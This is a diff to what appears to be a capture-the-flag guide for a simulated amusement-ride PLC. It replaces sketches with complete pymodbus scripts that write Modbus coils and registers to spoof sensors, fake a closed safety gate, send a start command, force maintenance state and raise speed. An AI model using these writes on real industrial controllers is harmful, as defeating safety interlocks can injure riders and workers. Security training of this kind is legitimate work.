@@ -61,17 +61,14 @@ If all three pass, `safety_ok` becomes TRUE and the ride can start.
 
 **Python Example:**
 ```python
-import socket
-import struct
+from pymodbus.client import ModbusTcpClient
 
-# Connect to PLC via MitM proxy
-client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client.connect(('localhost', 8502))
-
-# Write FALSE to proximity_sensor when it should be TRUE
-# Modbus function code 5 (Write Single Coil)
-msg = struct.pack('>HHHBBHH', 0, 0, 6, 1, 5, 0, 0)
-client.send(msg)
+# Connect to PLC
+client = ModbusTcpClient('localhost', port=502)
+if client.connect():
+    # Write FALSE to proximity_sensor
+    client.write_coil(0, False, unit=1)
+    client.close()
 ```
 
 ### 2. Zone Manipulation (Medium - 200pts)
@@ -83,8 +80,13 @@ client.send(msg)
 
 **Attack:**
 ```python
-# Disable zone 3
-write_coil(7, False)  # zone_3_enable = FALSE
+from pymodbus.client import ModbusTcpClient
+
+client = ModbusTcpClient('localhost', port=502)
+if client.connect():
+    # Disable zone 3 (coil 7)
+    client.write_coil(7, False, unit=1)
+    client.close()
 ```
 
 ### 3. Emergency Override (Easy - 150pts)
@@ -96,7 +98,13 @@ write_coil(7, False)  # zone_3_enable = FALSE
 
 **Attack:**
 ```python
-write_coil(2, True)  # emergency_stop_button = TRUE
+from pymodbus.client import ModbusTcpClient
+
+client = ModbusTcpClient('localhost', port=502)
+if client.connect():
+    # Trigger emergency stop (coil 3)
+    client.write_coil(3, True, unit=1)
+    client.close()
 ```
 
 ### 4. Speed Control (Hard - 300pts)
@@ -108,8 +116,13 @@ write_coil(2, True)  # emergency_stop_button = TRUE
 
 **Attack:**
 ```python
-# Modbus function code 6 (Write Single Register)
-write_register(0, 100)  # Max speed
+from pymodbus.client import ModbusTcpClient
+
+client = ModbusTcpClient('localhost', port=502)
+if client.connect():
+    # Write to input register 0 (speed_setpoint)
+    client.write_register(0, 100, unit=1)  # Max speed
+    client.close()
 ```
 
 ### 5. Safety Bypass (Hard - 350pts)
@@ -122,8 +135,15 @@ write_register(0, 100)  # Max speed
 
 **Attack:**
 ```python
-write_coil(4, True)   # Fake safety_gate_closed
-write_coil(10, True)  # Send start_command
+from pymodbus.client import ModbusTcpClient
+
+client = ModbusTcpClient('localhost', port=502)
+if client.connect():
+    # Fake safety_gate_closed
+    client.write_coil(4, True, unit=1)
+    # Send start_command
+    client.write_coil(1, True, unit=1)
+    client.close()
 ```
 
 ### 6. State Machine Attack (Hard - 400pts)
@@ -135,7 +155,13 @@ write_coil(10, True)  # Send start_command
 
 **Attack:**
 ```python
-write_register(6, 5)  # Force state = 5 (Maintenance)
+from pymodbus.client import ModbusTcpClient
+
+client = ModbusTcpClient('localhost', port=502)
+if client.connect():
+    # Write to state register (MW15 = holding register 1024+15)
+    client.write_register(1024 + 15, 5, unit=1)  # Force state = 5
+    client.close()
 ```
 
 ### 7. Runtime Manipulation (Medium - 250pts)
@@ -147,8 +173,14 @@ write_register(6, 5)  # Force state = 5 (Maintenance)
 
 **Attack:**
 ```python
-# Modbus function code 16 (Write Multiple Registers)
-write_double_register(2, 101)  # runtime_hours > 100
+from pymodbus.client import ModbusTcpClient
+
+client = ModbusTcpClient('localhost', port=502)
+if client.connect():
+    # Write to runtime_hours (MD2 = holding registers for DINT)
+    # DINT requires two consecutive registers
+    client.write_registers(1024 + 2, [0, 101], unit=1)  # 101 hours
+    client.close()
 ```
 
 ### 8. Full Laps Silent (Hard - 300pts)
